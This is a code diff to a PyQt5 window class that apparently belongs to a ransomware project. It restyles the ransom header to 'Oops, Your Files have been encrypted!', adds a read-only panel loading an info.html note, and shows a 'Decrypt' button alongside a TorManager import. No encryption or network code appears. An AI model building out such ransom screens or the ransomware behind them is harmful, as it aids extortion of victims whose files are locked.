@@ -1,7 +1,7 @@
 from PyQt5 import QtCore
 from PyQt5.QtCore import QSize
 from PyQt5.QtGui import QImage, QPalette, QBrush, QFont
-from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox
+from PyQt5.QtWidgets import QLabel, QPushButton, QWidget, QMessageBox, QTextEdit
 from Helper import Helper
 from TorManager import TorManager
 import Config
@@ -15,7 +15,7 @@ class GUI(QWidget):
     def __init__(self, uuid):
         self.uuid = uuid
         QWidget.__init__(self)
-        self.headerFont = QFont("Times", 25, QFont.AllUppercase)
+        self.headerFont = QFont("Times", 22, QFont.AllUppercase)
         self.setup()
 
     def setup(self):
@@ -38,10 +38,19 @@ class GUI(QWidget):
 
     def placeWidgets(self):
         #heading
-        self.lbHeader = QLabel("Your PC has been encrypted!", self)
+        self.lbHeader = QLabel("Oops, Your Files\nhave been encrypted!", self)
         self.lbHeader.setFont(self.headerFont)
         self.lbHeader.setStyleSheet("QLabel { color: white;}")
-        self.lbHeader.setGeometry(190, 10, 500, 50)
+        self.lbHeader.setGeometry(10, 15, 500, 120)
+
+        self.infoText = QTextEdit(self)
+        self.infoText.setReadOnly(True)
+        self.infoText.setGeometry(205, 150, 550, 360)
+        h = Helper()
+        with open(h.path('res/info.html'), 'r') as encrypt_info_file:
+            encrypt_text = encrypt_info_file.read().replace('\n', '')
+        self.infoText.setHtml(encrypt_text)
+
 
         #button decrypt
         self.btnDecrypt = QPushButton("Decrypt", self)
